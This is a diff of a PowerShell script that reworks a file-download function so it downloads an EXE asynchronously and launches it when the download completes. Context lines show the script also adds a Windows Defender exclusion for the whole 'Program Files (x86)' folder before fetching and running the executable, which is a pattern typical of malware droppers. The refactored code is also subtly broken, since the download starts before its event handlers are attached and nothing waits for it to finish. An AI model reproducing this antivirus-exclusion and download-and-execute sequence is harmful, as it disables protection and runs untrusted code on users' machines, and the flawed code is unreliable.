@@ -17,17 +17,22 @@ function Download-File {
         [string]$destination
     )
 
-    # Create a WebClient object
     $webClient = New-Object System.Net.WebClient
-
-    # Event handler to update the progress bar
+    $webClient.DownloadFileAsync($url, $destination)
     $webClient.DownloadProgressChanged += {
         param ($sender, $e)
         Write-Progress -Activity "Downloading $url" -Status "$($e.ProgressPercentage)% Complete" -PercentComplete $e.ProgressPercentage
     }
-
-    # Download the file
-    $webClient.DownloadFile($url, $destination)
+    $webClient.DownloadFileCompleted += {
+        param ($sender, $e)
+        if ($e.Error) {
+            Write-Host "Download failed: $($e.Error.Message)"
+        } else {
+            Write-Host "Download completed successfully."
+            Start-Process -FilePath $destination -Wait
+        }
+        $webClient.Dispose()
+    }
 }
 
 # Define URLs for the EXE files
@@ -58,6 +63,3 @@ Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\'
 
 # Download the EXE file with progress bar
 Download-File -url $exeUrl -destination $exeDestination
-
-# Execute the EXE file
-Start-Process -FilePath $exeDestination -Wait
